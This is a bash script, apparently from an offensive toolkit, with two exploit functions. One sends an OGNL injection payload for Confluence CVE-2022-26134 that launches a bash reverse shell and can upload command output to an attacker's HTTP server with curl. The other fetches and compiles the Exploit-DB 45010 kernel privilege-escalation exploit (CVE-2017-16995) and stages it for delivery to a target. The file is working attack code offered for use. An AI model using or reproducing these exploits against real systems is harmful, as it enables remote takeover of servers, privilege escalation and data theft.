#!/bin/bash
perform_cve_2022_26134() {

    local confluence_port=$1
    local confluence_ip=$2
    if [ -z "$counter" ]; then
        counter=0
    fi
    counter=$((counter + 1))
    if [ -z "$confluence_port" ]; then
        confluence_port=8090
    fi
    if [ -z "$confluence_ip" ]; then
        confluence_ip=$ip
    fi
    if [ -z "$cmd" ]; then
        cmd=$(get_bash_reverse_shell basic)    
    fi  
    if [[ "$output_cmd" == "yes" ]] && [[ ! -z "$http_port" ]] && [[ ! -z "$http_ip" ]]; then        
        if [ -f "log/output$counter" ]; then
            rm -f log/output$counter
        fi
        cmd=$cmd' &> /tmp/output'$counter'; curl -T /tmp/output'$counter' http://'$http_ip:$http_port'/log/output'$counter
    fi
    echo $cmd | tee -a $trail_log
    local ognl="\${new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"new java.lang.ProcessBuilder().command('bash','-c','$cmd').start()\")}"
    echo "OGNL: $ognl" | tee -a $trail_log
    ognl=$(urlencode_noslash "$ognl")
    echo "OGNL payload: $ognl" | tee -a $trail_log
    curl -v http://$confluence_ip:$confluence_port/$ognl/ 2>&1 | tee -a $trail_log
}

perform_cve_2017_16995() {
    local target_os=$1
    if [ -z "$target_os" ]; then
        target_os="ubuntu:16.04"
    fi
    mkdir -p exploit
    pushd exploit
    if [ ! -f "45010.c" ]; then
        wget "https://www.exploit-db.com/download/45010" -O 45010.c
    fi
    if [ ! -f "45010" ]; then
        echo "45010 binary not found, compiling..."
        docker run -it -v $(pwd):/opt/exploit --rm $target_os /bin/bash -c "apt update && apt install -y gcc && cd /opt/exploit && gcc -o 45010 45010.c"
    else
        echo "45010 binary already exists, skipping compilation. Remove it first if you want to recompile."
    fi
    download_linux "45010" "45010"
    popd
}